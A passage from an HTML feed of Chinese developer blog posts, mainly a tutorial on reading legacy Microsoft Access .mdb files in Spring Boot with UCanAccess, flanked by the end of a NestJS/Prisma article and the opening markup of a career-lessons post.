<p><strong>3. 文章创建</strong></p>
<p>对于数据的写入操作，Prisma 提供了直观的 <code>create</code> 方法。在 <code>createPost</code> 方法中，我们接收一个包含文章信息的对象，并将其保存到数据库中。</p>
<pre><code class="hljs language-php" lang="php">async <span class="hljs-title function_ invoke__">createPost</span>(<span class="hljs-attr">data</span>: { <span class="hljs-attr">title</span>: <span class="hljs-keyword">string</span>; <span class="hljs-attr">content</span>: <span class="hljs-keyword">string</span>; <span class="hljs-attr">userId</span>: <span class="hljs-keyword">string</span> }) {
  <span class="hljs-keyword">return</span> this.prisma.post.<span class="hljs-title function_ invoke__">create</span>({
    <span class="hljs-attr">data</span>: {
      <span class="hljs-attr">title</span>: data.title,
      <span class="hljs-attr">content</span>: data.content,
      <span class="hljs-attr">userId</span>: <span class="hljs-title function_ invoke__">Number</span>(data.userId)
    }
  });
}
</code></pre>
<h4 data-id="heading-3">四、总结</h4>
<p>通过本文的实战，我们不仅完成了 NestJS 与 Prisma 的集成，还实现了一个功能完备的文章管理模块。从环境配置、模型定义到服务的编写，我们探讨了如何利用 Prisma 的类型安全特性、<code>Promise.all</code> 的性能优化以及 DTO 的参数校验来构建高效、健壮的后端 API。</p>
<p>NestJS 与 Prisma 的结合，为开发者提供了一套强大的工具集，让我们可以更加专注于业务逻辑的实现，而无需过多担心底层的数据交互细节。希望本文能为你在使用 NestJS 构建应用时提供一些有价值的参考。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot解析.mdb文件实战指南]]></title>    <link>https://juejin.cn/post/7602234705250779199</link>    <guid>https://juejin.cn/post/7602234705250779199</guid>    <pubDate>2026-02-03T07:54:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602234705250779199" data-draft-id="7602211941513723958" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot解析.mdb文件实战指南"/> <meta itemprop="keywords" content="Spring Boot"/> <meta itemprop="datePublished" content="2026-02-03T07:54:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="修己xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot解析.mdb文件实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    修己xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T07:54:12.000Z" title="Tue Feb 03 2026 07:54:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>文章简介：本文介绍如何在SpringBoot项目中解析旧版Microsoft Access的.mdb文件。通过UCanAccess开源库，无需安装Access或ODBC驱动，即可实现跨平台数据读取。文中提供完整的Maven依赖配置、核心工具类封装及使用示例，帮助开发者快速完成遗留系统数据迁移。该方法尤其适合临时数据提取任务，为处理历史数据库提供便捷的Java解决方案。</p>
</blockquote>
<p>最近在做一个数据迁移项目，需要从老旧的<code>.mdb</code>（Microsoft Access）文件中提取数据。虽然Access数据库现在用得不多，但在一些遗留系统中还能见到。网上查了一圈，发现<code>UCanAccess</code>这个神器，结合AI的帮助，很快就完成了需求开发。<br/>
以下是<code>UCanAccess</code>的文档地址<a href="https://link.juejin.cn?target=http%3A%2F%2Fucanaccess.sourceforge.net%2Fsite.html" target="_blank" title="http://ucanaccess.sourceforge.net/site.html" ref="nofollow noopener noreferrer">ucanaccess.sourceforge.net/site.html</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48d03a61ab8141b7bc666358ea116208~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770710052&amp;x-signature=8eG4imXEIbfTe%2BcG%2FwHXs9OBzPM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">🚀 快速开始</h2>
<h3 data-id="heading-1">1️⃣ 引入Maven依赖</h3>
<p>首先，我们需要在<code>pom.xml</code>中添加UCanAccess的依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 添加UCanAccess依赖 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.sf.ucanaccess<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ucanaccess<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">2️⃣ 核心工具类实现</h3>
<p>下面是我封装的<code>MdbJdbcUtil.java</code>工具类，可以直接复制使用：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.sql.*;
<span class="hljs-keyword">import</span> java.util.*;
<span class="hljs-keyword">import</span> java.util.stream.Collectors;
<span class="hljs-keyword">import</span> java.util.stream.IntStream;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MdbJdbcUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DRIVER_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">"net.ucanaccess.jdbc.UcanaccessDriver"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">URL_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">"jdbc:ucanaccess://"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">URL_MEMORY</span> <span class="hljs-operator">=</span> <span class="hljs-string">";memory=false"</span>;

    <span class="hljs-comment">/**
     * 私有构造方法，防止实例化
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">MdbJdbcUtil</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(<span class="hljs-string">"This is a utility class and cannot be instantiated"</span>);
    }
    <span class="hljs-comment">/**
     * 静态初始化块，加载数据库驱动
     */</span>
    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            Class.forName(DRIVER_CLASS);
        } <span class="hljs-keyword">catch</span> (ClassNotFoundException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Failed to load UCanAccess JDBC driver"</span>, e);
        }
    }

    <span class="hljs-comment">/**
     * 创建数据库连接
     *
     * <span class="hljs-doctag">@param</span> mdbPath MDB文件路径
     * <span class="hljs-doctag">@return</span> 数据库连接
     * <span class="hljs-doctag">@throws</span> SQLException 如果连接失败
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String mdbPath)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">if</span> (mdbPath == <span class="hljs-literal">null</span> || mdbPath.trim().isEmpty()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"MDB file path cannot be null or empty"</span>);
        }

        <span class="hljs-type">Properties</span> <span class="hljs-variable">props</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();
        props.put(<span class="hljs-string">"charSet"</span>, <span class="hljs-string">"UTF-8"</span>);

        <span class="hljs-type">String</span> <span class="hljs-variable">dbUrl</span> <span class="hljs-operator">=</span> URL_PREFIX + mdbPath + URL_MEMORY;
        <span class="hljs-keyword">return</span> DriverManager.getConnection(dbUrl, props);
    }
    <span class="hljs-comment">/**
     * 执行带参数的查询并返回List&lt;Map&lt;String, Object&gt;&gt;结果
     *
     * <span class="hljs-doctag">@param</span> mdbPath MDB文件路径
     * <span class="hljs-doctag">@param</span> sql SQL查询语句
     * <span class="hljs-doctag">@param</span> params 查询参数列表
     * <span class="hljs-doctag">@return</span> 查询结果列表，每个Map代表一行数据
     * <span class="hljs-doctag">@throws</span> SQLException 如果查询失败
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Map&lt;String, Object&gt;&gt; <span class="hljs-title function_">queryForList</span><span class="hljs-params">(String mdbPath, String sql, Object... params)</span> <span class="hljs-keyword">throws</span> SQLException {
        validateParameters(mdbPath, sql);

        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">try</span> {
            conn = getConnection(mdbPath);
            stmt = conn.prepareStatement(sql);

            <span class="hljs-comment">// 设置查询参数</span>
            <span class="hljs-keyword">if</span> (params != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; params.length; i++) {
                    stmt.setObject(i + <span class="hljs-number">1</span>, params[i]);
                }
            }

            rs = stmt.executeQuery();
            <span class="hljs-keyword">return</span> convertResultSetToList(rs);

        } <span class="hljs-keyword">finally</span> {
            closeResources(rs, stmt, conn);
        }
    }

    <span class="hljs-comment">/**
     * 验证参数有效性
     *
     * <span class="hljs-doctag">@param</span> mdbPath MDB文件路径
     * <span class="hljs-doctag">@param</span> sql SQL语句
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">validateParameters</span><span class="hljs-params">(String mdbPath, String sql)</span> {
        <span class="hljs-keyword">if</span> (mdbPath == <span class="hljs-literal">null</span> || mdbPath.trim().isEmpty()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"MDB file path cannot be null or empty"</span>);
        }
        <span class="hljs-keyword">if</span> (sql == <span class="hljs-literal">null</span> || sql.trim().isEmpty()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"SQL statement cannot be null or empty"</span>);
        }
    }

    <span class="hljs-comment">/**
     * 关闭数据库资源
     *
     * <span class="hljs-doctag">@param</span> rs ResultSet对象
     * <span class="hljs-doctag">@param</span> stmt Statement对象
     * <span class="hljs-doctag">@param</span> conn Connection对象
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">closeResources</span><span class="hljs-params">(ResultSet rs, Statement stmt, Connection conn)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (rs != <span class="hljs-literal">null</span>) {
                rs.close();
            }
        } <span class="hljs-keyword">catch</span> (SQLException e) {
            <span class="hljs-comment">// 记录日志但不抛出异常</span>
            System.err.println(<span class="hljs-string">"Failed to close ResultSet: "</span> + e.getMessage());
        }

        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (stmt != <span class="hljs-literal">null</span>) {
                stmt.close();
            }
        } <span class="hljs-keyword">catch</span> (SQLException e) {
            System.err.println(<span class="hljs-string">"Failed to close Statement: "</span> + e.getMessage());
        }

        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (conn != <span class="hljs-literal">null</span>) {
                conn.close();
            }
        } <span class="hljs-keyword">catch</span> (SQLException e) {
            System.err.println(<span class="hljs-string">"Failed to close Connection: "</span> + e.getMessage());
        }
    }

    <span class="hljs-comment">/**
     * 将ResultSet转换为List&lt;Map&lt;String, Object&gt;&gt;
     *
     * <span class="hljs-doctag">@param</span> rs ResultSet对象
     * <span class="hljs-doctag">@return</span> 转换后的列表
     * <span class="hljs-doctag">@throws</span> SQLException 如果转换失败
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Map&lt;String, Object&gt;&gt; <span class="hljs-title function_">convertResultSetToList</span><span class="hljs-params">(ResultSet rs)</span> <span class="hljs-keyword">throws</span> SQLException {
        List&lt;Map&lt;String, Object&gt;&gt; resultList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

        <span class="hljs-keyword">if</span> (rs == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> resultList;
        }

        <span class="hljs-type">ResultSetMetaData</span> <span class="hljs-variable">metaData</span> <span class="hljs-operator">=</span> rs.getMetaData();
        <span class="hljs-type">int</span> <span class="hljs-variable">columnCount</span> <span class="hljs-operator">=</span> metaData.getColumnCount();

        <span class="hljs-comment">// 获取列名列表</span>
        List&lt;String&gt; columnNames = IntStream.rangeClosed(<span class="hljs-number">1</span>, columnCount)
                .mapToObj(i -&gt; {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-keyword">return</span> metaData.getColumnLabel(i);
                    } <span class="hljs-keyword">catch</span> (SQLException e) {
                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Failed to get column name"</span>, e);
                    }
                })
                .collect(Collectors.toList());

        <span class="hljs-comment">// 遍历结果集</span>
        <span class="hljs-keyword">while</span> (rs.next()) {
            Map&lt;String, Object&gt; row = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
            <span class="hljs-keyword">for</span> (String columnName : columnNames) {
                row.put(columnName, rs.getObject(columnName));
            }
            resultList.add(row);
        }

        <span class="hljs-keyword">return</span> resultList;
    }
}
</code></pre>
<h3 data-id="heading-3">3️⃣ 如何使用工具类</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-title class_">String</span>[] args) throws <span class="hljs-title class_">SQLException</span> {
        <span class="hljs-title class_">String</span> sql = <span class="hljs-string">"select * from UserInfo"</span>;
        <span class="hljs-title class_">String</span> mdbPath = <span class="hljs-string">"D:\mdb\mdbtest.mdb"</span>;
        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt;&gt; resultList = <span class="hljs-title class_">MdbJdbcUtil</span>.<span class="hljs-title function_">queryForList</span>(mdbPath,sql);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"查询结果数量"</span>+resultList.<span class="hljs-title function_">size</span>());
        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; row : resultList) {
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(row);
        }
    }
}
</code></pre>
<p>运行上面的代码，你会看到如下输出：</p>
<pre><code class="hljs language-ini" lang="ini">查询结果数量: 2
{<span class="hljs-attr">UserNO</span>=<span class="hljs-number">1</span>, UserID=Admin, UserName=管理员Admin, UserPassword=<span class="hljs-number">123456</span>}
{<span class="hljs-attr">UserNO</span>=<span class="hljs-number">2</span>, UserID=Xiuji, UserName=管理员Xiuji, UserPassword=<span class="hljs-number">123456789</span>}
</code></pre>
<h2 data-id="heading-4">⚠️ 注意事项</h2>
<ul>
<li>• memory设置</li>
</ul>
<p>在处理大型数据库并使用默认的"memory"设置（即驱动属性memory=true）时，建议用户通过-Xms和-Xmx选项为JVM分配足够的内存。否则，必须将驱动的"memory"属性设置为"false"</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb226cf5cb334f61a80c173ecaeb8b15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770710052&amp;x-signature=aAmhgbQq7vpeUnVotuITvy%2FE9IE%3D" alt="" loading="lazy"/></p>
<ul>
<li>• ignoreCase设置</li>
</ul>
<p>ignoreCase：此属性用于禁用(ignoreCase=true)或启用(ignoreCase=false)文本比较的区分大小写功能。默认值=true。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e6e41c61ae446b89a94ffba51b31a71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770710052&amp;x-signature=NvQUZcXOMsPaaP%2BKqV12GatsvZs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">📝 总结</h2>
<p>通过<code>UCanAccess</code>库，我们可以轻松地在SpringBoot项目中解析<code>.mdb</code>文件，无需依赖Windows环境或ODBC驱动。这个方案特别适合：</p>
<ul>
<li>• ✅ 临时数据提取任务</li>
<li>• ✅ 遗留系统数据迁移</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在 Google 14 年，我学到的 21 条经验]]></title>    <link>https://juejin.cn/post/7602411521071022099</link>    <guid>https://juejin.cn/post/7602411521071022099</guid>    <pubDate>2026-02-03T07:56:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602411521071022099" data-draft-id="7602234705250795583" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在 Google 14 年，我学到的 21 条经验"/> <meta itemprop="keywords" content="后端,前端"/> <meta itemprop="datePublished" content="2026-02-03T07:56:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="宇宙之一粟"/> <meta itemprop="url" content="https://juejin.cn/user/3526889034751639"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在 Google 14 年，我学到的 21 条经验
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3526889034751639/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    宇宙之一粟
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T07:56:19.000Z" title="Tue Feb 03 2026 07:56:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 